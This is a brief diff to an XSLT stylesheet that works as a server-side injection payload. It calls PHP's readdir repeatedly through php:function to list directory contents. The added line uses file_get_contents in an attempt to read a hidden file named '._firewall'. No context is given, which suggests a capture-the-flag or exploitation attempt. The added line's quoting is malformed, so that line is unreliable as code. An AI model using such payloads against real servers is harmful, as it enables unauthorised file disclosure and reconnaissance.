@@ -11,4 +11,5 @@
 <xsl:value-of select="php:function('readdir')"/> -
 <xsl:value-of select="php:function('readdir')"/> -
 <xsl:value-of select="php:function('readdir')"/> -
+<xsl:value-of select="php:function('file_get_contents, '._firewall')"/> -
 </xsl:template></xsl:stylesheet>
